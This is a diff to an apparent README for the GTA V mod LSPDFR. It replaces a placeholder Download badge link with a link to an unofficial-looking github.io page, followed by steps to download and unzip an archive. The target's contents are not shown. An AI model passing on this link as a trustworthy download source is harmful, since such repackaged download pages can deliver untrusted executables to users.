@@ -8,7 +8,7 @@ LSPDFR offers a deeply immersive law enforcement experience, supported by a larg
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://lspdfr-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Ensure **GTA V** is installed on your Windows PC.  
